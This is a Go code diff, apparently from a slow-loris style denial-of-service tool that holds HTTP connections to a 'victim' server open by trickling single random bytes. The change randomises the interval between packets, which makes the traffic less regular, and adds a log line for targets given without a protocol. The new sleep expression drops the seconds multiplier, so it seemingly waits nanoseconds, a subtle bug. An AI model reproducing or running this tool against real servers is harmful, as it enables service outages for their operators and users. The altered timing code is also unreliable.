@@ -146,15 +146,14 @@ func (m *connection) start(counter, timeout *uint64, quit chan bool) {
 		log.Printf("Failed to send the initial packet to #%d socket: %v", m.id, err)
 	}
 
-	sleep := time.Second * time.Duration(*timeout)
-
 	for {
 		select {
 		case <-quit:
 			return
 		default:
-			time.Sleep(sleep)
+			time.Sleep(time.Duration(rand.Int63n(int64(*timeout) + 1)))
 
+			// send 1 byte packet every time
 			randPackets := make([]byte, 1)
 			randPackets[0] = byte(rand.Intn(256))
 
@@ -237,6 +236,7 @@ func parseArguments() *attackParams {
 	if !strings.Contains(*server, "http://") && !strings.Contains(*server, "https://") {
 		s := fmt.Sprintf("http://%s", *server)
 		server = &s
+		log.Printf("The protocol has not been specified for the target server [%s], will use http", s)
 	}
 
 	victimURL, err := url.ParseRequestURI(*server)
